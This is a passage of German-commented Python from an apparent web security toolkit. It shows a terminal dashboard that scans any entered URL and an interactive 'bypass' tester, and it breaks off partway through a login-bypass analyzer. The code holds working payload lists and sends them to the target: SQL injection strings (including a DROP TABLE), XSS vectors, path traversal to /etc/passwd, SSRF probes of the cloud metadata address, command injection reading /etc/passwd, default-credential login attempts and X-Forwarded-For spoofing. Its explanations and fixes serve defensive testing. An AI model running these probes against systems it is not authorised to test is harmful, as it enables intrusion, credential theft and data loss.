        print(f"  {DIM2}╔{'═'*W}╗{R}")
        title = f"  {BLU}SECURITY DASHBOARD{R}  {DIM2}·{R}  {YEL}{base[:45]}{R}  {DIM2}·{R}  {DIM2}{now}{R}"
        print(f"  {DIM2}║{R}{_pad(title, W)}{DIM2}║{R}")
        print(f"  {DIM2}╠{'═'*W}╣{R}")

        # Kategorien
        cats = {
            "SERVER":    [k for k in checks if k.startswith("SRV")],
            "HEADERS":   [k for k in checks if k.startswith("HDR")],
            "BYPASSES":  [k for k in checks if k.startswith("BYP")],
            "DATEIEN":   [k for k in checks if k.startswith("FIL")],
            "INJECTION": [k for k in checks if k.startswith("INJ")],
        }
        for cat_name, keys in cats.items():
            if not keys: continue
            print(f"  {DIM2}║{R}  {YEL}{cat_name:<12}{DIM2}{'─'*(W-14)}{R}")
            cols = []
            for k in keys:
                st, det = checks[k]
                if st == 3:   icon = f"{BRED}[KRIT]{R}"; col = BRED
                elif st == 2: icon = f"{RED}[VULN]{R}"; col = RED
                elif st == 1: icon = f"{YEL}[WARN]{R}"; col = YEL
                else:         icon = f"{GRN}[ OK ]{R}"; col = DIM2
                label = checks[k][1][:26]
                cols.append(f"{icon} {col}{label}{R}")
            # 2 pro Zeile
            for i in range(0, len(cols), 2):
                left  = cols[i]
                right = cols[i+1] if i+1 < len(cols) else ""
                line  = f"  {left:<55}  {right}"
                print(f"  {DIM2}║{R}{_pad('  '+left, 37)}{DIM2}│{R}{_pad('  '+right if right else '', W-37)}{DIM2}║{R}")

        if scanning:
            print(f"  {DIM2}╠{'═'*W}╣{R}")
            spin_ch = random.choice("⣾⣽⣻⢿⡿⣟⣯⣷")
            print(f"  {DIM2}║{R}  {BLU}{spin_ch}{R}  {DIM2}Scanne: {scanning:<50}{R}  {DIM2}║{R}")
        print(f"  {DIM2}╚{'═'*W}╝{R}")

    def _set(key, status, detail):
        checks[key] = (status, detail)
        _draw(scanning=key.split("_",1)[-1] if "_" in key else key)

    # ── Scans ─────────────────────────────────────────────
    _draw("Verbinde ...")

    # SERVER
    c, hdrs, body, final = _req(base)
    server  = hdrs.get("Server","")
    powered = hdrs.get("X-Powered-By","")
    _set("SRV_Erreichbar",  0 if c > 0 else 2, f"HTTP {c}" if c else "Nicht erreichbar")
    _set("SRV_Server",      1 if server else 0, server[:26] if server else "Versteckt ✓")
    _set("SRV_Powered-By",  1 if powered else 0, powered[:26] if powered else "Versteckt ✓")
    _set("SRV_HTTPS",       0 if base.startswith("https") else 2, "HTTPS ✓" if base.startswith("https") else "KEIN HTTPS!")

    # HEADERS
    hdr_map = {
        "HDR_HSTS":    ("Strict-Transport-Security", 2, "HSTS fehlt"),
        "HDR_CSP":     ("Content-Security-Policy",   2, "CSP fehlt"),
        "HDR_XFO":     ("X-Frame-Options",           1, "Clickjacking möglich"),
        "HDR_XCTO":    ("X-Content-Type-Options",    1, "MIME-Sniff möglich"),
        "HDR_CORP":    ("Cross-Origin-Resource-Policy",0,"CORP fehlt"),
    }
    for key, (hname, sev, msg) in hdr_map.items():
        if hname in hdrs: _set(key, 0, hname.split("-")[-1]+" ✓")
        else:             _set(key, sev, msg)

    # BYPASSES — schnelle Checks
    # SQLi
    c2,_,b2,u2 = _req(f"{base}/?id=1'")
    sqli = any(x in b2.lower() for x in ["sql","mysql","syntax error","warning:","odbc"])
    _set("BYP_SQL-Injection", 3 if sqli else 0, "MÖGLICH — Fehler sichtbar!" if sqli else "Kein Fehler")

    # XSS
    pay = urllib.parse.quote("<script>alert(1)</script>", safe='')
    c3,_,b3,_ = _req(f"{base}/?q={pay}")
    xss = "<script>alert(1)</script>" in b3
    _set("BYP_XSS Reflected", 3 if xss else 0, "REFLECTED XSS!" if xss else "Nicht reflektiert")

    # Auth Bypass
    c4,_,b4,u4 = _req(base+"/admin")
    admin_open = c4 == 200 and any(x in b4.lower() for x in ["dashboard","admin","panel"])
    _set("BYP_Admin-Panel", 2 if admin_open else 0, "OFFEN!" if admin_open else f"HTTP {c4}")

    # Rate Limit
    codes = []
    for _ in range(6):
        cx,_,_,_ = _req(f"{base}/?r={random.randint(0,99999)}")
        codes.append(cx); time.sleep(0.05)
    rl = 429 in codes
    _set("BYP_Rate-Limit", 0 if rl else 1, "Aktiv ✓" if rl else "Kein Limit erkannt")

    # XFF Bypass
    c5,_,_,_ = _req(base, hdrs={"X-Forwarded-For":"127.0.0.1"})
    xff = (c5 != c)
    _set("BYP_XFF-Bypass", 1 if xff else 0, "Antwort unterscheidet sich" if xff else "Kein Unterschied")

    # DATEIEN
    file_checks = [
        ("FIL_dot-env",    "/.env",          ["DB_","SECRET","APP_KEY"],      3, ".env EXPOSED!"),
        ("FIL_git",        "/.git/HEAD",     ["ref:","HEAD"],                 3, ".git EXPOSED!"),
        ("FIL_phpMyAdmin", "/phpmyadmin/",   ["phpmyadmin","pma"],             2, "phpMyAdmin offen!"),
        ("FIL_backup",     "/backup.zip",    [],                               2, "Backup erreichbar!"),
        ("FIL_swagger",    "/swagger.json",  ["swagger","paths"],              1, "API-Docs offen"),
        ("FIL_robots",     "/robots.txt",    ["Disallow"],                     0, "robots.txt offen"),
    ]
    for key, path, sigs, sev, msg in file_checks:
        cx,_,bx,_ = _req(base+path)
        if cx == 200 and (not sigs or any(s in bx for s in sigs)):
            _set(key, sev, msg)
        else:
            _set(key, 0, path+" ✓")

    # INJECTION
    # Path Traversal
    cx,_,bx,_ = _req(f"{base}/?file=../../../etc/passwd")
    lfi = "root:x:" in bx
    _set("INJ_Path-Traversal", 3 if lfi else 0, "LFI /etc/passwd!" if lfi else "Nicht anfällig")

    # SSRF
    cx,_,bx,_ = _req(f"{base}/?url=http://169.254.169.254/")
    ssrf = any(x in bx.lower() for x in ["ami-id","instance","metadata"])
    _set("INJ_SSRF", 3 if ssrf else 0, "AWS Metadata!" if ssrf else "Kein SSRF")

    # Cmd Injection
    cx,_,bx,_ = _req(f"{base}/?cmd=id")
    cmdi = any(x in bx for x in ["uid=","root","www-data"])
    _set("INJ_CMD-Inject", 3 if cmdi else 0, "CMD-Exec möglich!" if cmdi else "Nicht anfällig")

    # CSRF
    forms = re.findall(r'<form[^>]*>.*?</form>', body, re.DOTALL|re.IGNORECASE)
    csrf_vuln = any(not re.search(r'csrf|_token|nonce', f, re.IGNORECASE) for f in forms) if forms else False
    _set("INJ_CSRF", 2 if csrf_vuln else 0, "Kein CSRF-Token!" if csrf_vuln else "Token vorhanden ✓")

    # ── FINAL DRAW ohne "scanning" ────────────────────────
    _draw()

    # ── SCORE BERECHNEN ──────────────────────────────────
    total  = len(checks)
    crits  = sum(1 for s,_ in checks.values() if s==3)
    highs  = sum(1 for s,_ in checks.values() if s==2)
    warns  = sum(1 for s,_ in checks.values() if s==1)
    oks    = sum(1 for s,_ in checks.values() if s==0)
    score  = max(0, 100 - crits*20 - highs*10 - warns*3)

    if score >= 80:   sc = GRN;  grade = "A — GUT GESICHERT"
    elif score >= 60: sc = YEL;  grade = "B — VERBESSERUNGSBEDARF"
    elif score >= 40: sc = RED;  grade = "C — GEFÄHRDET"
    else:             sc = BRED; grade = "D — KRITISCH UNSICHER"

    print(f"\n  {DIM2}╔{'═'*W}╗{R}")
    print(f"  {DIM2}║{R}  {YEL}SECURITY SCORE:{R}  {sc}{score}/100  —  {grade}{R}")
    print(f"  {DIM2}║{R}  {BRED}KRITISCH: {crits:<3}{R}  {RED}HOCH: {highs:<3}{R}  {YEL}WARN: {warns:<3}{R}  {GRN}OK: {oks}{R}")

    # Erklärungsdatenbank für jede Check-ID
    ERKLAERUNGEN = {
        "SQL-Injection":    (
            "Was:  Der Server baut Nutzereingaben direkt in SQL-Queries ein.",
            "Wie:  Eingabe wie  ' OR '1'='1  macht den Login immer wahr.",
            "Fix:  Prepared Statements nutzen — niemals Strings in SQL bauen.",
        ),
        "XSS Reflected":    (
            "Was:  Der Server gibt deine Eingabe unverändert zurück.",
            "Wie:  <script>alert(1)</script> wird im Browser ausgeführt.",
            "Fix:  Alle Ausgaben HTML-enkodieren (htmlspecialchars).",
        ),
        "Admin-Panel":      (
            "Was:  /admin ist ohne Login erreichbar.",
            "Wie:  Einfach /admin aufrufen — kein Passwort nötig.",
            "Fix:  Authentifizierung + IP-Whitelist für Admin-Bereich.",
        ),
        "Rate-Limit":       (
            "Was:  Kein Schutz gegen Brute-Force — unbegrenzte Login-Versuche.",
            "Wie:  Passwörter können automatisch durchprobiert werden.",
            "Fix:  Max. 5-10 Versuche/Minute + Lockout nach Fehlversuchen.",
        ),
        "XFF-Bypass":       (
            "Was:  Server vertraut X-Forwarded-For Header zur IP-Erkennung.",
            "Wie:  Header fälschen: X-Forwarded-For: 127.0.0.1",
            "Fix:  Rate-Limit nach Session/Cookie statt IP.",
        ),
        "HSTS fehlt":       (
            "Was:  Kein HTTP Strict Transport Security Header gesetzt.",
            "Wie:  Angreifer kann HTTP-Verbindung erzwingen (MITM).",
            "Fix:  Header setzen: Strict-Transport-Security: max-age=31536000",
        ),
        "CSP fehlt":        (
            "Was:  Keine Content Security Policy — XSS-Angriffe leichter.",
            "Wie:  Externe Scripts können ungehindert geladen werden.",
            "Fix:  CSP-Header setzen: Content-Security-Policy: default-src 'self'",
        ),
        "Clickjacking möglich": (
            "Was:  Seite kann in einem iframe eingebettet werden.",
            "Wie:  Unsichtbarer iframe täuscht Nutzer zu ungewollten Klicks.",
            "Fix:  Header: X-Frame-Options: DENY",
        ),
        "MIME-Sniff möglich": (
            "Was:  Browser errät Dateityp — führt evtl. Scripts aus.",
            "Wie:  Upload mit falschem MIME-Type → Browser führt aus.",
            "Fix:  Header: X-Content-Type-Options: nosniff",
        ),
        ".env EXPOSED!":    (
            "Was:  .env Datei ist öffentlich abrufbar!",
            "Wie:  Enthält DB-Passwörter, API-Keys, Secrets.",
            "Fix:  .env aus Web-Root entfernen + Webserver-Regel: deny .env",
        ),
        ".git EXPOSED!":    (
            "Was:  .git Verzeichnis ist erreichbar — kompletter Quellcode!",
            "Wie:  git clone http://ziel/.git  rekonstruiert den Code.",
            "Fix:  .git aus Web-Root, Webserver-Regel: deny .git",
        ),
        "phpMyAdmin offen!": (
            "Was:  phpMyAdmin Datenbank-Interface öffentlich erreichbar.",
            "Wie:  Brute-Force Login → voller Datenbank-Zugriff.",
            "Fix:  Nur über VPN/IP-Whitelist erreichbar machen.",
        ),
        "Backup erreichbar!": (
            "Was:  Backup-Datei ist öffentlich downloadbar.",
            "Wie:  Enthält oft kompletten Code + Datenbank-Dumps.",
            "Fix:  Backups außerhalb des Web-Roots speichern.",
        ),
        "API-Docs offen":   (
            "Was:  Swagger/OpenAPI Doku zeigt alle Endpunkte.",
            "Wie:  Angreifer lernt die gesamte API-Struktur kennen.",
            "Fix:  API-Doku hinter Authentifizierung schützen.",
        ),
        "LFI /etc/passwd!": (
            "Was:  Local File Inclusion — beliebige Dateien lesbar.",
            "Wie:  ?file=../../../etc/passwd liest Systemdateien.",
            "Fix:  Dateipfade nie aus Nutzereingaben bauen.",
        ),
        "AWS Metadata!":    (
            "Was:  SSRF — Server fragt interne AWS-Metadaten ab.",
            "Wie:  ?url=http://169.254.169.254/ gibt Credentials zurück.",
            "Fix:  Outbound-Requests whiteListen, keine internen IPs erlauben.",
        ),
        "CMD-Exec möglich!": (
            "Was:  Command Injection — Systembefehle werden ausgeführt.",
            "Wie:  ?cmd=id gibt Benutzer-Info zurück.",
            "Fix:  Niemals Nutzereingaben in Systembefehle einbauen.",
        ),
        "Kein CSRF-Token!": (
            "Was:  Formulare ohne CSRF-Schutz — Cross-Site Request Forgery.",
            "Wie:  Böse Seite schickt im Hintergrund Anfragen im Namen des Nutzers.",
            "Fix:  CSRF-Token in jedes Formular einbauen.",
        ),
        "KEIN HTTPS!":      (
            "Was:  Verbindung komplett unverschlüsselt.",
            "Wie:  Jeder im Netzwerk sieht Passwörter, Cookies, alles.",
            "Fix:  SSL-Zertifikat einrichten (kostenlos: Let's Encrypt).",
        ),
    }

    # Kurzfassung + Erklärungen
    vulns = [(k.split("_",1)[-1], det, st) for k,(st,det) in checks.items() if st >= 2]

    print(f"  {DIM2}╠{'═'*W}╣{R}")
    if vulns:
        print(f"  {DIM2}║{R}  {BRED}⚠  {len(vulns)} SCHWACHSTELLEN GEFUNDEN — Erklärungen:{R}")
        print(f"  {DIM2}╠{'═'*W}╣{R}")
        for i, (name, det, st) in enumerate(vulns, 1):
            sev_icon = f"{BRED}[KRITISCH]{R}" if st==3 else f"{RED}[HOCH]    {R}"
            print(f"  {DIM2}║{R}  {sev_icon}  {YEL}{name}{R}")
            # Erklärung suchen
            erkl = None
            for key, lines in ERKLAERUNGEN.items():
                if key.lower() in name.lower() or key.lower() in det.lower():
                    erkl = lines; break
            if erkl:
                for line in erkl:
                    tag  = line[:4]
                    rest = line[4:]
                    if tag.startswith("Was"):  col = BLU
                    elif tag.startswith("Wie"): col = YEL
                    else:                       col = GRN
                    print(f"  {DIM2}║{R}    {col}{tag}{DIM2}{rest}{R}")
            else:
                print(f"  {DIM2}║{R}    {DIM2}{det}{R}")
            if i < len(vulns):
                print(f"  {DIM2}║{R}  {DIM2}{'·'*W}{R}")
    else:
        print(f"  {DIM2}║{R}  {GRN}[✓] Keine Bypasses gefunden — gut gesichert!{R}")

    print(f"  {DIM2}╠{'═'*W}╣{R}")
    print(f"  {DIM2}║{R}  {DIM2}Tool 103 = alle Bypasses + vollständige Dokumentation{R}")
    print(f"  {DIM2}║{R}  {DIM2}Tool 102 = kompletter Vuln-Scan (SQLi, XSS, LFI, SSRF...){R}")
    print(f"  {DIM2}╚{'═'*W}╝{R}")

    # ── BYPASS LIVE TESTEN ───────────────────────────────────
    if not vulns:
        wait(); return

    # Bypass-Aktionen: für jeden Typ eine ausführbare Test-Funktion
    def _live_test(name, det):
        clear()
        print(BANNER)
        print(f"\n  {BRED}[ LIVE BYPASS TEST ]{R}  {YEL}{name}{R}\n")
        print(f"  {DIM2}Ziel: {base}{R}\n")

        name_l = name.lower()

        # ── SQL Injection ────────────────────────────────
        if "sql" in name_l:
            payloads = [
                ("' OR '1'='1",             "Klassisch"),
                ("' OR 1=1--",              "Kommentar"),
                ("admin'--",               "Admin-Login"),
                ("' UNION SELECT 1,2,3--",  "UNION"),
                ("1' AND SLEEP(2)--",       "Time-based"),
                ("' OR 'x'='x",            "String-Vergleich"),
            ]
            print(f"  {DIM2}Teste SQL-Injection Payloads gegen:{R}  {G}{base}/?id=PAYLOAD{R}\n")
            for pay, label in payloads:
                url_t = f"{base}/?id={urllib.parse.quote(pay, safe='')}"
                t0 = time.time()
                c2,_,b2,_ = _req(url_t)
                dt = time.time()-t0
                b2l = b2.lower()
                errs = [x for x in ["sql","mysql","syntax error","warning:","odbc","sqlite"] if x in b2l]
                delay_hit = dt > 1.5 and "sleep" in pay.lower()
                hit = bool(errs) or delay_hit
                icon = f"{BRED}[HIT!]{R}" if hit else f"{DIM2}[miss]{R}"
                detail = f"Fehler: {errs[0]}" if errs else (f"Delay {dt:.1f}s" if delay_hit else f"HTTP {c2}")
                print(f"  {icon}  {YEL}{label:<20}{R}  {DIM2}{pay:<30}{R}  {G if hit else DIM2}{detail}{R}")
                time.sleep(0.1)

        # ── XSS ──────────────────────────────────────────
        elif "xss" in name_l:
            payloads = [
                ("<script>alert(1)</script>",         "Klassisch"),
                ("<img src=x onerror=alert(1)>",      "IMG-Event"),
                ('"><script>alert(1)</script>',        "Attribut-Escape"),
                ("<svg onload=alert(1)>",             "SVG"),
                ("<ScRiPt>alert(1)</ScRiPt>",         "Case-Bypass"),
                ("javascript:alert(1)",               "JS-Proto"),
                ("%3Cscript%3Ealert(1)%3C%2Fscript%3E","URL-Encoded"),
            ]
            print(f"  {DIM2}Teste XSS Payloads gegen:{R}  {G}{base}/?q=PAYLOAD{R}\n")
            for pay, label in payloads:
                url_t = f"{base}/?q={urllib.parse.quote(pay, safe='')}"
                c2,_,b2,_ = _req(url_t)
                reflected = pay.lower() in b2.lower() or pay.replace('"','') in b2
                icon = f"{BRED}[REFLECTED!]{R}" if reflected else f"{DIM2}[miss]      {R}"
                print(f"  {icon}  {YEL}{label:<20}{R}  {DIM2}{pay[:35]}{R}")
                time.sleep(0.1)

        # ── Path Traversal / LFI ─────────────────────────
        elif "lfi" in name_l or "traversal" in name_l or "path" in name_l:
            payloads = [
                ("../../../etc/passwd",                "Linux Basis"),
                ("..%2F..%2F..%2Fetc%2Fpasswd",        "URL-Encoded"),
                ("....//....//....//etc/passwd",       "Doppelung"),
                ("..%252f..%252fetc%252fpasswd",       "Doppel-Encode"),
                ("../../../windows/win.ini",           "Windows"),
                ("/etc/passwd",                        "Absoluter Pfad"),
                ("php://filter/read=convert.base64-encode/resource=index.php", "PHP Wrapper"),
            ]
            print(f"  {DIM2}Teste Path Traversal gegen:{R}  {G}{base}/?file=PAYLOAD{R}\n")
            for pay, label in payloads:
                url_t = f"{base}/?file={pay}"
                c2,_,b2,_ = _req(url_t)
                hit = "root:x:" in b2 or "[fonts]" in b2 or "[boot" in b2
                icon = f"{BRED}[LESEN!]{R}" if hit else f"{DIM2}[miss]  {R}"
                snippet = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {YEL}{label:<22}{R}  {DIM2}{snippet}{R}")
                time.sleep(0.1)

        # ── SSRF ─────────────────────────────────────────
        elif "ssrf" in name_l:
            payloads = [
                ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
                ("http://169.254.169.254/latest/user-data",  "AWS Userdata"),
                ("http://127.0.0.1:22",                      "localhost SSH"),
                ("http://127.0.0.1:6379",                    "localhost Redis"),
                ("http://localhost/admin",                   "localhost Admin"),
                ("http://0.0.0.0/",                         "0.0.0.0"),
                ("file:///etc/passwd",                       "file:// Proto"),
            ]
            print(f"  {DIM2}Teste SSRF gegen:{R}  {G}{base}/?url=PAYLOAD{R}\n")
            for pay, label in payloads:
                url_t = f"{base}/?url={urllib.parse.quote(pay, safe='')}"
                c2,_,b2,_ = _req(url_t)
                hit = any(x in b2.lower() for x in ["ami-id","instance-id","root:x:","redis","connected","ssh"])
                icon = f"{BRED}[SSRF!]{R}" if hit else f"{DIM2}[miss] {R}"
                snippet = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {YEL}{label:<22}{R}  {DIM2}{snippet}{R}")
                time.sleep(0.1)

        # ── Command Injection ─────────────────────────────
        elif "cmd" in name_l or "command" in name_l:
            payloads = [
                ("; id",          ["uid=","root","www-data"],  "Semikolon"),
                ("| id",          ["uid=","root","www-data"],  "Pipe"),
                ("`id`",          ["uid=","root","www-data"],  "Backtick"),
                ("$(id)",         ["uid=","root","www-data"],  "Subshell"),
                ("; whoami",      ["root","www","nobody"],     "Whoami"),
                ("; cat /etc/passwd", ["root:x:"],             "Passwortdatei"),
                ("& ping -n 1 127.0.0.1 &", [],               "Ping (Windows)"),
            ]
            print(f"  {DIM2}Teste Command Injection gegen:{R}  {G}{base}/?cmd=PAYLOAD{R}\n")
            for pay, sigs, label in payloads:
                url_t = f"{base}/?cmd={urllib.parse.quote(pay, safe='')}"
                t0 = time.time()
                c2,_,b2,_ = _req(url_t)
                dt = time.time()-t0
                hit = bool(sigs) and any(s in b2 for s in sigs)
                icon = f"{BRED}[EXEC!]{R}" if hit else f"{DIM2}[miss] {R}"
                snippet = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {YEL}{label:<18}{R}  {DIM2}{pay:<25}{R}  {G if hit else DIM2}{snippet}{R}")
                time.sleep(0.1)

        # ── Rate Limit ────────────────────────────────────
        elif "rate" in name_l:
            print(f"  {DIM2}Sende 20 schnelle Anfragen — prüfe ob geblockt wird ...{R}\n")
            blocked_at = None
            for i in range(1, 21):
                c2,h2,_,_ = _req(f"{base}/?ratetest={i}", hdrs={"X-Forwarded-For": f"1.2.3.{i}"})
                retry = h2.get("Retry-After","")
                icon  = f"{BRED}[BLOCK]{R}" if c2==429 else f"{GRN}[ OK  ]{R}"
                print(f"  {icon}  Anfrage {i:>2}  HTTP {c2}  {'Retry-After: '+retry if retry else ''}")
                if c2 == 429 and not blocked_at:
                    blocked_at = i
                    print(f"\n  {GRN}[✓] Rate-Limit greift nach {i} Anfragen — SICHER{R}\n")
                    break
                time.sleep(0.05)
            if not blocked_at:
                print(f"\n  {BRED}[!] Alle 20 Anfragen erfolgreich — KEIN Rate-Limit!{R}")

        # ── .env / Datei ──────────────────────────────────
        elif ".env" in name_l or "exposed" in name_l or "git" in name_l:
            paths = [
                "/.env", "/.env.local", "/.env.production", "/.env.backup",
                "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
                "/config.php.bak", "/wp-config.php.bak", "/database.sql",
                "/backup.zip", "/backup.tar.gz", "/.htpasswd",
            ]
            print(f"  {DIM2}Teste sensitive Dateien ...{R}\n")
            for path in paths:
                url_t = base + path
                c2,_,b2,_ = _req(url_t)
                sensitive = any(x in b2 for x in ["DB_","SECRET","APP_KEY","[core]","ref:","password","define("])
                icon = f"{BRED}[EXPO!]{R}" if (c2==200 and sensitive) else (f"{YEL}[200?]{R}" if c2==200 else f"{DIM2}[ --- ]{R}")
                snippet = b2[:35].replace("\n"," ") if sensitive else ""
                print(f"  {icon}  {DIM2}{path:<30}{R}  HTTP {c2}  {G if sensitive else DIM2}{snippet}{R}")
                time.sleep(0.08)

        # ── CSRF ─────────────────────────────────────────
        elif "csrf" in name_l:
            print(f"  {DIM2}Teste CSRF — sendet POST ohne Token ...{R}\n")
            c2,_,b2,u2 = _req(base, "POST", {"test":"csrf_bypass_test"})
            accepted = c2 not in (403,422) and "invalid" not in b2.lower() and "csrf" not in b2.lower()
            if accepted:
                print(f"  {BRED}[!] POST ohne CSRF-Token akzeptiert (HTTP {c2}) — ANFÄLLIG!{R}")
            else:
                print(f"  {GRN}[✓] POST abgelehnt (HTTP {c2}) — CSRF-Schutz aktiv{R}")

        # ── Allgemein ─────────────────────────────────────
        else:
            print(f"  {DIM2}Live-Test für '{name}' — manuell prüfen.{R}")
            print(f"  {DIM2}Details: {det}{R}")

        print(f"\n  {DIM2}{'─'*W}{R}")
        input(f"  {DG}ENTER = zurück zum Dashboard{R} ")

    # ── Interaktives Menü ─────────────────────────────────
    while True:
        clear()
        print(BANNER)
        print(f"\n  {BRED}BYPASS LIVE TESTER{R}  {DIM2}—  {base}{R}\n")
        print(f"  {DIM2}╔{'═'*W}╗{R}")
        print(f"  {DIM2}║{R}  {YEL}Welchen Bypass willst du live testen?{R}")
        print(f"  {DIM2}╠{'═'*W}╣{R}")
        for i, (name, det, st) in enumerate(vulns, 1):
            sev = f"{BRED}[KRIT]{R}" if st==3 else f"{RED}[HOCH]{R}"
            print(f"  {DIM2}║{R}  {C}[{i}]{R}  {sev}  {YEL}{name}{R}  {DIM2}{det}{R}")
        print(f"  {DIM2}║{R}  {DIM2}[0]  Beenden{R}")
        print(f"  {DIM2}╚{'═'*W}╝{R}")
        choice = input(f"\n  {DG}►{R} ").strip()
        if choice == "0" or not choice: break
        if choice.isdigit() and 1 <= int(choice) <= len(vulns):
            n, d, s = vulns[int(choice)-1]
            _live_test(n, d)
    wait()


# ── 103  BYPASS ANALYZER & DOKUMENTATION ────────────────────
def bypass_analyzer():
    hdr("BYPASS ANALYZER & DOKUMENTATION")
    RED  = "\033[91m"; BRED = "\033[1;91m"; YEL = "\033[93m"
    print(f"  {RED}Findet alle Login/Server/WAF/Auth Bypasses — nur eigene Ziele!{R}\n")

    base     = inp("Ziel-URL (z.B. https://example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "http://" + base
    base = base.rstrip("/")

    login_url = inp("Login-URL (leer = base + /login)")
    if not login_url:
        login_url = base + "/login"
    elif not login_url.startswith("http"):
        login_url = base + "/" + login_url.lstrip("/")

    u_field = inp("Benutzername-Feld [username]") or "username"
    p_field = inp("Passwort-Feld [password]") or "password"

    report = []   # (kategorie, bypass_name, payload, ergebnis, erklaerung, fix)
    W = 74

    def _req(url, method="GET", data=None, headers=None, timeout=7):
        h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
        if headers: h.update(headers)
        try:
            bd = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else (data.encode() if isinstance(data, str) else data)
            req = urllib.request.Request(url, data=bd, method=method, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, dict(r.headers), r.read(16384).decode(errors="ignore"), r.url
        except urllib.error.HTTPError as e:
            try: body = e.read(8192).decode(errors="ignore")
            except: body = ""
            return e.code, dict(e.headers), body, url
        except Exception as ex:
            return 0, {}, str(ex), url

    def _login(user, pw, extra_headers=None):
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        if extra_headers: h.update(extra_headers)
        return _req(login_url, "POST", {u_field: user, p_field: pw}, headers=h)

    def _success(code, body, url_after):
        bl = body.lower()
        if code in (200, 302) and any(x in bl for x in ["dashboard","welcome","logout","profil","account","home","admin"]):
            return True
        if url_after != login_url and "login" not in url_after.lower():
            return True
        return False

    def _log(kategorie, name, payload, gefunden, erklaerung, fix):
        report.append((kategorie, name, payload, gefunden, erklaerung, fix))
        icon = f"{BRED}[BYPASS!]{R}" if gefunden else f"{DIM}[sicher] {R}"
        print(f"  {DG}║{R}  {icon}  {C}{name:<30}{R}  {DIM}{payload[:25]}{R}")

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}BYPASS ANALYSE: {base[:55]}{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    # ════════════════════════════════════════════════════════
    # BLOCK 1: LOGIN BYPASS via SQL Injection
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── LOGIN BYPASS (SQLi) ──{R}")
    sqli_logins = [
        ("SQLi Classic",          "' OR '1'='1",     "' OR '1'='1",
         "Die häufigste SQL-Injection: OR-Bedingung macht Login immer wahr.",
         "Prepared Statements + Parameterisierung nutzen."),
        ("SQLi Admin-Kommentar",  "admin'--",         "irgendwas",
         "Kommentar ignoriert Passwort-Check in SQL-Query.",
         "Prepared Statements. Niemals Nutzereingaben in SQL-String."),
        ("SQLi Admin #",          "admin'#",          "irgendwas",
         "# kommentiert Rest des Queries aus (MySQL).",
         "Prepared Statements verwenden."),
        ("SQLi Blind OR",         "' OR 1=1--",       "' OR 1=1--",
         "Blind-Injection: Boolean-Bedingung erzwingt Login.",
         "Input validieren + Prepared Statements."),
        ("SQLi UNION",            "' UNION SELECT 1,1--","' UNION SELECT 1,1--",
         "UNION erweitert Ergebnis-Set auf immer-wahre Werte.",
         "Prepared Statements, Least-Privilege DB-User."),
        ("SQLi Nullbyte",         "admin\x00",        "irgendwas",
         "Nullbyte terminiert String in C-basierten Backends.",
         "Input sanitisieren, Nullbytes filtern."),
        ("SQLi Doppel-Query",     "'; DROP TABLE--",  "irgendwas",
         "Zweite Query nach Semikolon wird ausgeführt.",
         "Prepared Statements, keine Multi-Queries erlauben."),
        ("SQLi LIKE-Wildcard",    "' OR username LIKE '%admin%'--","irgendwas",
         "LIKE-Operator findet Admin-Account ohne exakten Namen.",
         "Prepared Statements."),
    ]
    for name, user_pay, pw_pay, erkl, fix in sqli_logins:
        c, h2, b2, url2 = _login(user_pay, pw_pay)
        found = _success(c, b2, url2)
        _log("LOGIN-BYPASS (SQLi)", name, user_pay, found, erkl, fix)
        time.sleep(0.1)

    # ════════════════════════════════════════════════════════
    # BLOCK 2: LOGIN BYPASS via Auth-Logik-Fehler
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── AUTH-LOGIK BYPASSES ──{R}")
    auth_bypasses = [
        ("Leeres Passwort",       "admin",    "",
         "Server akzeptiert leeres Passwort — fehlende Validierung.",
         "Serverseitig leere Passwörter ablehnen."),
        ("Leerzeichen-Passwort",  "admin",    " ",
         "Manche Systeme trimmen Passwörter nicht.",
         "Passwort vor Vergleich trimmen + validieren."),
        ("Null-Passwort",         "admin",    "null",
         "PHP: 'null' == false kann Auth umgehen.",
         "Strikter Typvergleich (===) in PHP."),
        ("Array-Injection",       "admin",    "[]",
         "PHP: Array-Parameter umgehen String-Vergleich.",
         "Eingabetyp validieren, is_string() prüfen."),
        ("Admin default",         "admin",    "admin",
         "Standard-Credentials nicht geändert.",
         "Starke Standard-Passwörter erzwingen."),
        ("Admin/admin123",        "admin",    "admin123",
         "Schwaches Standard-Passwort.",
         "Passwort-Stärke-Policy einführen."),
        ("Root/root",             "root",     "root",
         "Root-Account mit Standard-Passwort.",
         "Root-Login deaktivieren oder umbenennen."),
        ("Test/test",             "test",     "test",
         "Test-Account wurde nicht entfernt.",
         "Test-Accounts aus Produktion entfernen."),
        ("User: ' or 1=1",        "' or 1=1--","anything",
         "Klassischer Auth-Bypass durch SQL-Fehler.",
         "Prepared Statements."),
        ("JSON Typ-Verwirrung",   "admin",    "true",
         "JSON: true als Passwort umgeht Boolean-Vergleich.",
         "Strikter Typvergleich in API-Endpunkten."),
    ]
    for name, user, pw, erkl, fix in auth_bypasses:
        c, h2, b2, url2 = _login(user, pw)
        found = _success(c, b2, url2)
        _log("AUTH-BYPASS", name, f"{user}:{pw}", found, erkl, fix)
        time.sleep(0.1)

    # ════════════════════════════════════════════════════════
    # BLOCK 3: RATE-LIMIT BYPASS via Header-Manipulation
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── RATE-LIMIT BYPASSES (Header) ──{R}")
    base_c, _, _, _ = _login("wrong", "wrong")
    rate_hdrs = [
        ("X-Forwarded-For Bypass",   {"X-Forwarded-For": f"127.0.0.{random.randint(1,254)}"},
         "X-Forwarded-For: 127.0.0.x",
         "Server vertraut XFF-Header zur IP-Erkennung — angreifbar.",
